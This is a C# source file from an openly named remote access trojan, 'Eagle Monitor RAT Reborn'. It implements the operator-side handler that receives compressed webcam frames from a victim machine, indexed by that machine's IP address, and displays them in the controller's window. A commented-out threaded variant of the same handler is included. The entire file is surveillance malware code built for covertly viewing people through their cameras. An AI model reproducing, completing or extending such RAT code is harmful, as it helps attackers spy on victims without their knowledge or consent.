using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteCameraCapturePacketHandler
    {
        public RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket remoteCameraCapturePacket) : base()//, ClientHandler clientHandler)
        {
            //TO TEST !!!!!

            try
            {
                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamHandler.hasAlreadyConnected = true;
                    if (ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture)) != null)
                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                }));
                return;
            }
            catch { }

            /*new Thread(() =>
            {
                try
                {
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.BeginInvoke((MethodInvoker)(() =>
                    {
                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamHandler.hasAlreadyConnected = true;
                        if (ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture)) != null)
                            ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                    }));
                    return;
                }
                catch { }
            }).Start();*/
        }
    }
}
